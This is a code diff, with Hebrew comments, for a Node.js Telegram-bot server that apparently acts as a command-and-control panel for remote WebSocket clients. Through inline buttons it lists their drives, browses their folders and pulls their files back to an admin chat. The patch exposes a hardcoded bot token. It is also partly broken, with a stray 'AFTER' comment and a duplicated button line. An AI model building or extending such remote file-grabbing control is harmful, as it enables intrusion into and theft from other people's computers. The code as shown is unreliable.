@@ -10,6 +10,7 @@ const TelegramBot = require('node-telegram-bot-api');
 const NodeCache = require('node-cache');
 const cron = require('node-cron');
 const fetch = require('node-fetch'); // Required for fetching HTML file for broadcasts
+const crypto = require('crypto');
 
 // --- Configuration ---
 const BOT_TOKEN = '8269940964:AAGnrhFtLPZUJHP_mMtrI8skdlqDhkSFJIg';
@@ -19,6 +20,18 @@ const PORT = process.env.PORT || 3000;
 // --- In-Memory Storage & Setup ---
 const cache = new NodeCache({ stdTTL: 86400, checkperiod: 120 });
 const clients = new Map(); // Stores active WebSocket connections { clientId -> { ws, name } }
+// שמירת מטען כפתורים ב-token קצר כדי לא לחרוג מ-64 בתים של Telegram
+function makeCb(action, data, ttlSec = 600) {
+  const id = crypto.randomBytes(6).toString('base64url'); // ~8 תווים, בטוח ל-URL
+  cache.set(`cb:${id}`, { action, ...data }, ttlSec);
+  return `cb:${id}`;
+}
+
+function readCb(cbData) {
+  if (!cbData || !cbData.startsWith('cb:')) return null;
+  const id = cbData.slice(3);
+  return cache.get(`cb:${id}`);
+}
 
 // --- Express App & HTTP Server Setup ---
 const app = express();
@@ -194,24 +207,39 @@ async function handleCallbackQuery(callbackQuery) {
     const [action, ...params] = data.split(':');
     
     bot.answerCallbackQuery(callbackQuery.id).catch(console.error);
+    // --- Router חדש ל-callback_data קצרים (cb:<token>) ---
+    const short = readCb(data);
+    if (short) {
+        const { action, clientId, path } = short;
 
-    // --- NEW: Item Selection from Cache ---
-    if (action === 'select_item') {
-        const [cacheKey, itemIndex] = params;
-        const items = cache.get(cacheKey);
-        const selectedItem = items?.[parseInt(itemIndex)];
+        if (action === 'select_client' || action === 'list_dir' || action === 'get_file') {
+            const client = clients.get(clientId);
 
-        if (!selectedItem) {
-            return bot.editMessageText('❌ Error: This selection has expired or is invalid. Please start over.', {
-                chat_id: message.chat.id, message_id: message.message_id,
-                reply_markup: { inline_keyboard: [[{ text: '‹ Back to Client List', callback_data: 'manage_clients' }]] }
+            if (!client || client.ws.readyState !== WebSocket.OPEN) {
+                return bot.editMessageText(`❌ Client *${clients.get(clientId)?.name || 'Unknown'}* is offline.`, {
+                    chat_id: message.chat.id, message_id: message.message_id, parse_mode: 'Markdown',
+                    reply_markup: { inline_keyboard: [[{ text: '‹ Back to Client List', callback_data: 'manage_clients' }]] }
+                });
+            }
+
+            let command = { type: 'get_drives' };
+            let feedbackText = `Requesting drives from *${clients.get(clientId).name}*...`;
+
+            if (action === 'list_dir') {
+                command = { type: 'list_dir', payload: { path } };
+                feedbackText = `Listing: \`${path}\``;
+            } else if (action === 'get_file') {
+                command = { type: 'get_file', payload: { path } };
+                feedbackText = `Requesting file: \`${path}\``;
+            }
+
+            client.ws.send(JSON.stringify(command));
+            return bot.editMessageText(feedbackText, {
+                chat_id: message.chat.id, message_id: message.message_id, parse_mode: 'Markdown'
             });
         }
-        
-        // Construct the original callback_data and re-process it
-        const newAction = selectedItem.isDirectory ? 'list_dir' : 'get_file';
-        const newCallbackData = `${newAction}:${cache.get(`${cacheKey}_clientId`)}:${btoa(selectedItem.path)}`;
-        return handleCallbackQuery({ ...callbackQuery, data: newCallbackData });
+
+        // אם תרצה בעתיד: למפות פעולות נוספות ל-tokenים קצרים
     }
 
     // --- Remote Control Actions ---
@@ -297,34 +325,46 @@ async function handleResultFromClient(data) {
 
     if (type === 'get_drives_result') {
         const drives = payload.drives;
-        const keyboard = drives.map(drive => [{ text: `💽 ${drive}`, callback_data: `list_dir:${clientId}:${btoa(drive)}` }]);
+// AFTER
+const keyboard = drives.map(drive => [
+  { text: `💽 ${drive}`, callback_data: makeCb('list_dir', { clientId, path: drive }) }
+]);
+keyboard.push([{ text: '‹ Back to Client List', callback_data: 'manage_clients' }]);
         keyboard.push([{ text: '‹ Back to Client List', callback_data: 'manage_clients' }]);
         return bot.sendMessage(ADMIN_CHAT_ID, `Select a drive to browse on *${clientName}*:`, { parse_mode: 'Markdown', reply_markup: { inline_keyboard: keyboard }});
     }
 
-    if (type === 'list_dir_result') {
-        const { path: currentPath, items } = payload;
+if (type === 'list_dir_result') {
+  const { path: currentPath, items } = payload;
 
-        // --- FIX: Cache the result and generate short callbacks ---
-        const cacheKey = `dir:${clientId}:${Date.now()}`;
-        cache.set(cacheKey, items, 300); // Cache for 5 minutes
-        cache.set(`${cacheKey}_clientId`, clientId, 300); // Also cache the client ID for context
+  const keyboard = [];
 
-        const keyboard = items.map((item, index) => {
-            const icon = item.isDirectory ? '📁' : '📄';
-            // Use the short, safe callback_data
-            return [{ text: `${icon} ${item.name}`, callback_data: `select_item:${cacheKey}:${index}` }];
-        });
-        
-        if (currentPath.includes('\\') && currentPath.slice(-2) !== ':\\') {
-             const parentDir = currentPath.substring(0, currentPath.lastIndexOf('\\'));
-             // The "Go Up" button still uses the full path as it's less likely to be too long
-             keyboard.unshift([{ text: '⬆️ Go Up', callback_data: `list_dir:${clientId}:${btoa(parentDir || currentPath.slice(0, 3))}` }]);
-        }
-        keyboard.push([{ text: '‹ Back to Client List', callback_data: 'manage_clients' }]);
-        
-        return bot.sendMessage(ADMIN_CHAT_ID, `Contents of \`${currentPath}\` on *${clientName}*:`, { parse_mode: 'Markdown', reply_markup: { inline_keyboard: keyboard }});
-    }
+  // כפתור "עלה תיקייה" – בלי base64, עם token קצר
+  if (currentPath.includes('\\') && currentPath.slice(-2) !== ':\\') {
+    const parentDir = currentPath.substring(0, currentPath.lastIndexOf('\\')) || currentPath.slice(0, 3);
+    keyboard.push([
+      { text: '⬆️ Go Up', callback_data: makeCb('list_dir', { clientId, path: parentDir }) }
+    ]);
+  }
+
+  // כל פריט: יוצר token קצר, שומר את המטען בקאש, ושולח callback_data קצר
+  for (const item of items) {
+    const icon = item.isDirectory ? '📁' : '📄';
+    const action = item.isDirectory ? 'list_dir' : 'get_file';
+    keyboard.push([
+      { text: `${icon} ${item.name}`, callback_data: makeCb(action, { clientId, path: item.path }) }
+    ]);
+  }
+
+  keyboard.push([{ text: '‹ Back to Client List', callback_data: 'manage_clients' }]);
+
+  return bot.sendMessage(
+    ADMIN_CHAT_ID,
+    `Contents of \`${currentPath}\` on *${clientName}*:`,
+    { parse_mode: 'Markdown', reply_markup: { inline_keyboard: keyboard } }
+  );
+}
+
     
     if (type === 'get_file_result') {
         const { fileName, fileData_base64 } = payload;
@@ -363,7 +403,7 @@ async function showClientList(chatId, messageId) {
             if (clientData) {
                 // ודא שהלקוח באמת מחובר ב-WebSocket לפני שמציגים אותו
                 if (clients.has(clientId) && clients.get(clientId).ws.readyState === WebSocket.OPEN) {
-                     keyboard.push([{ text: `🟢 ${clientData.name}`, callback_data: `select_client:${clientId}` }]);
+keyboard.push([{ text: `🟢 ${clientData.name}`, callback_data: makeCb('select_client', { clientId }) }]);
                 } else {
                     // אם הוא רשום ב-cache אבל לא מחובר, הצג אותו כאופליין
                      keyboard.push([{ text: `🔴 ${clientData.name} (Offline)`, callback_data: `noop` }]);
